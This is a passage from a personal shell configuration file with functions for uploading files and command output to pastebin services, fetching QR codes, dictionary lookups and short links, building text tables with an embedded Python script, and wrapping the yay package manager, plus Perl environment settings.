    [ -f "$HOME/.netrc" ] && opts='-n'
    while getopts ":hd:i:n:" x; do
        case $x in
            h) echo "ix [-d ID] [-i ID] [-n N] [opts]"; return;;
            d) $echo curl $opts -X DELETE ix.io/$OPTARG; return;;
            i) opts="$opts -X PUT"; local id="$OPTARG";;
            n) opts="$opts -F read:1=$OPTARG";;
        esac
    done
    shift $(($OPTIND - 1))
    [ -t 0 ] && {
        local filename="$1"
        shift
        [ "$filename" ] && {
            curl $opts -F f:1=@"$filename" $* ix.io/$id
            return
        }
        echo "^C to cancel, ^D to send."
    }
    curl $opts -F f:1='<-' $* ix.io/$id
}


crl_syntax() {
	curl -F  'sprunge=<$1' http://sprunge.us
	$1 | curl -F 'sprunge=<-' http://sprunge.us
	 curl -T- https://pub.iotek.org/paste.php <file
	 echo "only visible twice" | curl -F 'f:1=<-' -F 'read:1=2' ix.io
}
crl() {		# 5/18/21
	help() {
		echo -e $RED"
			┏━┓┳━┓┳  
			┃  ┃┳┛┃  
			┗━┛┇┗┛┇━┛
	Usage: crl <[OPTS]> <{ARGS}>
	  options:
		-c Upload STDOUT from a command
		-f Upload a file
		-r Remove a paste
		-p Upload a photo {!} Not removable yet {!}
		-d Dictionary
		-q Generate a QR code
		-l Link shortener
		-h Show this help menu
    "
    return
	}
	local opts
	local OPTIND
	[ -f "/usr/bin/curl" ] && opts='-n'
	while getopts ":hc:f:d:p:q:r:l:" x; do
		case $x in
			h) help;;
			r) curl -X DELETE https://paste.rs/$2; return;;
			c) $2 | curl --data-binary @- https://paste.rs/;return;;
			f) curl --data-binary @$OPTARG https://paste.rs;return;;
			p) curl --upload-file $2 http://paste.c-net.org/;return;;
			q) curl https://qrenco.de/$OPTARG;return;;
			d) curl dict://dict.org/d:$OPTARG;return;;
			l) curl -F "shorten=$OPTARG" http://0x0.st;return;;
		esac
	done
	shift $(($OPTIND - 1))
}

ps1() {
	echo  "PS1='┌──[яøøԵ@Windows98]─[\w]\\=n└──╼ \$ '"
}


function tableX { # 09/22/21
	python3 <<EOF
from tabulate import tabulate
def get_headers():
    print('--HEADERS--')
    num = 1
    headers = []
    while True:
        new_h = input(f'HEADER #{num}: ')
        num += 1
        # Break if no value given
        if new_h == '':
            break
        headers.append(new_h)
    return headers
def get_body(head_len):
    print('--BODY--')
    body = []
    num2 = 1
    num3 = 1
    while True:
        # Check if user will add new values to make new row
        print('--New Row--')
        new_col = input(f'ONE.{num2}: ')
        num2 += 1
        # Break if no value given
        if new_col == '':
            break
        # Each sub array is a row
        body.append([])
        # Append previous test value
        body[-1].append(new_col)
        # -1 because we alreade added the 1st value
        for column in range(head_len-1):
            new_col = input(f'TWO.{num3}: ')
            num3 += 1
            # This will append the new value to the last array added
            body[-1].append(new_col)
   
    return body

headers = get_headers()

# Here the lenght of the headers array is provided, so that the
# body rows are the same
body = get_body(len(headers))
#headers = ["UID", "NAME","NUMBER"]
#table = [[uid1,name1,number1],[uid2,name2,number2]]
print(tabulate(body, headers, tablefmt="fancy_grid"))
EOF
}


# WSL Stuff
alias stuff="cd '/mnt/c/Users/Gaming PC/Stuff'"



function install {
	yay -S ${@:1}
}
function update {
	yay -Syu
}
function search {
	yay "${@:1}"
}


PATH="/home/wax/.perl5/bin${PATH:+:${PATH}}"; export PATH;
PERL5LIB="/home/wax/.perl5/lib/perl5${PERL5LIB:+:${PERL5LIB}}"; export PERL5LIB;
PERL_LOCAL_LIB_ROOT="/home/wax/.perl5${PERL_LOCAL_LIB_ROOT:+:${PERL_LOCAL_LIB_ROOT}}"; export PERL_LOCAL_LIB_ROOT;
PERL_MB_OPT="--install_base \"/home/wax/.perl5\""; export PERL_MB_OPT;
PERL_MM_OPT="INSTALL_BASE=/home/wax/.perl5"; export PERL_MM_OPT;
